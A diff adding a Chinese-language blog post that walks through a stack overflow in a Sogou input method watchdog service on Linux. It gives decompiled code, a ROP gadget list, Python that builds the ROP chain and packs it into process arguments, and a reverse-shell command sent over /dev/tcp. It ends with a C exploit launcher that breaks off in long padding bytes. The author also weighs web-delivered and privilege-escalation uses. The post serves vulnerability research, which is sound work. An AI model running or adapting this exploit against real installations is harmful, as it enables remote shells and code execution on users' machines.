@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>sogou_stack_overflow</title>
+  <meta name="description" content="0x00 前言">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/jekyll/update/2019/01/02/sogou_stack_overflow.html">
+  <link rel="alternate" type="application/rss+xml" title="Your awesome title" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Your awesome title</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">sogou_stack_overflow</h1>
+    <p class="post-meta"><time datetime="2019-01-02T21:01:05+08:00" itemprop="datePublished">Jan 2, 2019</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <h2 id="0x00">0x00 前言</h2>
+
+<p>这个漏洞其实根本就是人在家中坐，洞从天上来。。。本菜鸟没做任何的fuzz，就是他直接在我的电脑上崩了。。。我所唯一做的其实是我在做一道pwn的时候，这个pwn的输入是argv[1]，溢出也是这个参数所导致的。。所以我给了一个很长的命令行参数，然后结果另外一个搜狗输入法的服务崩了。。。</p>
+
+<p><img src="coredump" alt="coredump.png"></p>
+
+<h2 id="0x01">0x01 漏洞点</h2>
+
+<p>作为一个玩二进制安全的新手，第一反应是看看crash信息，一看崩溃点是在一个ret上面。我就想这不会是什么栈溢出吧。。。拖进IDA找到ret的位置0x40A260</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">__int64</span> <span class="nf">vuln</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">DIR</span> <span class="o">*</span><span class="n">dir</span><span class="p">;</span> <span class="c1">// rbx
+</span>  <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// rax
+</span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span> <span class="c1">// rbp
+</span>  <span class="kt">char</span> <span class="n">c</span><span class="p">;</span> <span class="c1">// al
+</span>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">char_to_int</span><span class="p">;</span> <span class="c1">// dl
+</span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">p_</span><span class="p">;</span> <span class="c1">// rax
+</span>  <span class="n">__pid_t</span> <span class="n">pid</span><span class="p">;</span> <span class="c1">// er13
+</span>  <span class="kt">FILE</span> <span class="o">*</span><span class="n">v7</span><span class="p">;</span> <span class="c1">// r8
+</span>  <span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// ST00_8
+</span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v9</span><span class="p">;</span> <span class="c1">// rax
+</span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// ebp
+</span>  <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-638h]
+</span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span> <span class="c1">// [rsp+210h] [rbp-438h]
+</span>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span> <span class="c1">// [rsp+410h] [rbp-238h]
+</span>
+  <span class="n">dir</span> <span class="o">=</span> <span class="n">opendir</span><span class="p">(</span><span class="s">"/proc/"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">dir</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">v10</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
+    <span class="n">perror</span><span class="p">(</span><span class="s">"Couldn't open the /proc/ directory"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">v10</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="nl">LABEL_2:</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">v1</span> <span class="o">=</span> <span class="n">readdir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v1</span> <span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span><span class="o">-&gt;</span><span class="n">d_type</span> <span class="o">==</span> <span class="n">DT_DIR</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">p</span> <span class="o">=</span> <span class="n">v1</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">;</span>
+      <span class="n">c</span> <span class="o">=</span> <span class="n">v1</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">c</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">char_to_int</span> <span class="o">=</span> <span class="n">c</span> <span class="o">-</span> <span class="sc">'0'</span><span class="p">;</span>
+        <span class="n">p_</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">char_to_int</span> <span class="o">&lt;=</span> <span class="mi">9u</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="k">while</span> <span class="p">(</span> <span class="o">*++</span><span class="n">p_</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)(</span><span class="o">*</span><span class="n">p_</span> <span class="o">-</span> <span class="sc">'0'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">9u</span> <span class="p">)</span>
+              <span class="k">goto</span> <span class="n">LABEL_2</span><span class="p">;</span>
+          <span class="p">}</span>
+          <span class="k">goto</span> <span class="n">all_number</span><span class="p">;</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+      <span class="k">else</span>
+      <span class="p">{</span>
+<span class="nl">all_number:</span>
+        <span class="n">pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">pid</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">strtol</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">memset</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">));</span>
+          <span class="n">qmemcpy</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"/proc/"</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
+          <span class="n">__strcpy_chk</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">filename</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">p</span><span class="p">,</span> <span class="mh">0x200LL</span><span class="p">);</span>
+          <span class="n">__strcat_chk</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"/cmdline"</span><span class="p">,</span> <span class="mh">0x200LL</span><span class="p">);</span>
+          <span class="n">v7</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"rt"</span><span class="p">);</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">s</span><span class="p">));</span>
+            <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+            <span class="n">fscanf</span><span class="p">(</span><span class="n">v7</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span><span class="c1">//溢出点
+</span>            <span class="n">fclose</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
+            <span class="n">v9</span> <span class="o">=</span> <span class="n">strrchr</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="sc">'/'</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="n">v9</span> <span class="p">)</span>
+              <span class="n">__strcpy_chk</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)(</span><span class="n">v9</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="mh">0x200LL</span><span class="p">);</span>
+            <span class="k">else</span>
+              <span class="n">__strcpy_chk</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x200LL</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="n">sub_409470</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"fcitx"</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">)</span>
+            <span class="p">{</span>
+              <span class="n">v10</span> <span class="o">=</span> <span class="n">strtol</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+              <span class="n">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
+              <span class="k">return</span> <span class="n">v10</span><span class="p">;</span>
+            <span class="p">}</span>
+          <span class="p">}</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="n">v10</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+  <span class="n">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">v10</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>果然，fscanf存在缓冲区溢出，s的大小为512字节，而fscanf是一个危险的函数，没有任何缓冲区长度的限制。</p>
+
+<p>找到溢出点之后，就要看看我们能不能控制输入。如果可以，就能成功利用。那么输入点是什么，往上看，这个file是通过fopen打开的。而fopen的文件路径是什么？经过逆向分析，这个函数实际上是在遍历/proc这个文件夹。查阅资料，这个文件夹存放所有的进程的信息，而进程pid是文件夹名。这个函数会遍历这个文件夹，然后如果是一个纯数字文件夹，就打开他里面的cmdline的内容，然后fscanf进行读取。如果第一个参数存在子串fcitx（不区分大小写），便返回这个进程的pid。如果查阅资料，发现cmdline存放的是命令行的数据。但是是parse好的（参数之间用\0分隔开）。</p>
+
+<p>fscanf获取所有进程的命令行参数时存在溢出，好吧，看看能不能利用。</p>
+
+<p>PS：</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">__strcpy_chk</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">filename</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">p</span><span class="p">,</span> <span class="mh">0x200LL</span><span class="p">);</span>
+</code></pre></div>
+<p>这个地方其实也有溢出6个字节，但是感觉没法利用。。。</p>
+
+<h2 id="0x02-payload">0x02 构造payload</h2>
+
+<p>接下来看看能不能利用。checksec发现没有canary也没有PIE，好消息，这样就能用ROP了。</p>
+
+<p>这里顺便说一下fscanf这个函数，他其实遇到\x00不会截断，但是遇到空格回车就会截断了，所以构造payload的时候要防止这几个字符的出现。</p>
+
+<h3 id="system">system函数</h3>
+
+<p>看下这个文件，发现有system函数可用，很幸运。</p>
+<div class="highlight"><pre><code class="language-assembly" data-lang="assembly">.plt:0000000000406D80 ; int system(const char *command)
+.plt:0000000000406D80 _system         proc near               ; CODE XREF: sub_409490+9D↓p
+.plt:0000000000406D80                                         ; sub_40A660+9F3↓p ...
+.plt:0000000000406D80                 jmp     cs:off_68F258
+.plt:0000000000406D80 _system         endp
+</code></pre></div>
+<p>我们的目标是，反弹一个shell到本机端口上面，即，执行</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="sb">`</span>/bin/sh &gt;&amp; /dev/tcp/127.0.0.1/8080 0&gt;&amp;1<span class="sb">`</span>
+</code></pre></div>
+<p>但是，system函数（/bin/dash）好像并不支持&gt;&amp;这种语法，所以要写成</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="s">"echo </span><span class="se">\"</span><span class="s">/bin/sh &gt;&amp; /dev/tcp/127.0.0.1/8080 0&gt;&amp;1</span><span class="se">\"</span><span class="s"> | /bin/bash</span><span class="se">\x00</span><span class="s">"</span>
+</code></pre></div>
+<h3 id="rop">ROP</h3>
+
+<p>接着开始思考如何构造ROP。</p>
+
+<p>首先我们需要把这个字符串写入到一片内存，然后用这片内存的起始地址作为参数调用system。</p>
+
+<p>用ROPgadget搜索ROP，发现很多gadget可以用（这种商业程序开起优化来能用的gadget就是多啊，一般CTF最多就一个leave+ret。。。）</p>
+
+<p>但是问题来了，不能出现空格，而这里空格是无法避免的，所以我们可以先写进去一个!然后动态减1让他变成空格（空格的ASCII就是感叹号减1）</p>
+
+<p>用到的ROP基本上就是套路了，用了pop reg; ret来让寄存器加载我们的数据，然后xchg mem, reg 来把值写入内存。然后sub mem, reg来进行减一操作，具体用到的是</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c"># 0x0000000000408ed5 pop rbp ; ret</span>
+<span class="c"># 0x0000000000418fa0 pop rcx ; ret</span>
+<span class="c"># 0x000000000046e162 xchg dword ptr [rcx], ebp ; ret</span>
+<span class="c"># 0x0000000000462DD6 sub [rdi], cl</span>
+<span class="c"># 0x0000000000407912 pop rdi ; ret</span>
+</code></pre></div>
+<p>然后生成payload的代码是</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">get_space_idx</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">new_payload</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">length</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">" "</span><span class="p">:</span>
+            <span class="n">ret</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+            <span class="n">new_payload</span> <span class="o">+=</span> <span class="s">"!"</span> <span class="c"># ! is space + 1 in ASCII</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">new_payload</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+
+    <span class="k">return</span> <span class="n">ret</span><span class="p">,</span> <span class="n">new_payload</span>
+
+<span class="k">def</span> <span class="nf">form_rop_chain</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">,</span> <span class="n">old_payload</span><span class="p">):</span>
+    <span class="n">spaces_idx</span><span class="p">,</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">get_space_idx</span><span class="p">(</span><span class="n">old_payload</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="p">(</span><span class="mi">4</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">))</span> <span class="o">*</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="n">pop_rbp_ret</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x408ed5</span><span class="p">)</span>
+    <span class="n">pop_rcx_ret</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x418fa0</span><span class="p">)</span>
+    <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x407912</span><span class="p">)</span>
+    <span class="n">xchg_ret</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x46e162</span><span class="p">)</span>
+    <span class="n">sub_rdi_cl</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x462DD6</span><span class="p">)</span>
+    <span class="n">payload_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">payload_len</span><span class="p">:</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="n">pop_rbp_ret</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">4</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="n">pop_rcx_ret</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">buf_addr</span><span class="p">)</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="n">xchg_ret</span>
+        <span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">spaces_idx</span><span class="p">)):</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="n">pop_rcx_ret</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="n">pop_rdi_ret</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">spaces_idx</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">+</span> <span class="n">buf_addr</span><span class="p">)</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="n">sub_rdi_cl</span>
+
+    <span class="n">ret</span> <span class="o">+=</span> <span class="n">pop_rdi_ret</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span> <span class="c"># rdi是参数所存放的寄存器</span>
+
+    <span class="n">ret</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x406D80</span><span class="p">)</span> <span class="c"># system</span>
+    <span class="n">ret</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">ret</span>
+</code></pre></div>
+<p>其中，buf_addr是目标内存地址，这里会给一个.data的地址，而old_payload是所需要写入的字符串，即前面所说的一句话反弹shell指令。</p>
+
+<p>说下所遇到的坑，就是我在调的时候太久没调x64程序了，然后就犯蠢了，忘了第一个参数是rdi，把第一个参数放在了栈中。然后rdi又刚好指向最后一个空格，所以搞得我一直没发现。。。</p>
+
+<h3 id="linux-payload-cmdline">利用Linux参数传递性质讲payload装入cmdline文件</h3>
+
+<p>接着我们发现，我们需要让我们的缓冲区填充+payload放入cmdline文件，这样fscanf才能读到他。那么又有一个问题了，参数之间只能有一个&#39;\x00&#39;，但是我们需要很多个连续的0，怎么办？这个时候我琢磨到一个技巧，就是给一个空参数，就会产生连续的0。比方说./xxx &quot;&quot; aaa，在./xxx和aaa之间，就有两个\0。</p>
+
+<p>具体实现代码如下：</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">payload_to_args</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">ret</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+    <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">length</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">:</span>
+            <span class="n">ret</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">ret</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+            <span class="n">idx</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="n">ret</span>
+</code></pre></div>
+<p>这个函数就是把payload转换成array，使得如果用这个array作为参数创建进程的话，能使得cmdline文件中的内容是原来的payload。</p>
+
+<p>这样的话，payload就构造完成了，到时候就会把填充+ROP fscanf到栈里面并且溢出，然后走我们的ROP，最后执行反弹shell的命令（其实打开一个正向shell也可以）</p>
+
+<h2 id="0x03">0x03 最大化利用漏洞</h2>
+
+<p>很不幸的是，这个watchdog服务不是root运行的，所以并没有提权到root的功能（如果这个洞没用就尴尬了）</p>
+
+<p>然后我又想，如果能把这个洞作为网马。比方说，JavaScript能调用本地的某个服务，任意一个都行，并且能控制他的参数（比方说flash什么的？然而看了看flash好像并不能控制他的参数），就可以作为网马来使了。可惜并没有。。。</p>
+
+<p>所以总不可能一个任意代码执行的栈溢出到了搜狗的src只能爆个低危吧！这个时候看看能不能从guest提权到本地用户？</p>
+
+<p>改成C语言</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;unistd.h&gt;
+#include &lt;memory.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span><span class="kt">void</span> <span class="nf">exploit</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"start exploiting</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">getchar</span><span class="p">();</span>
+    <span class="n">execl</span><span class="p">(</span><span class="s">"./expl"</span><span class="p">,</span> <span class="s">"./expl"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\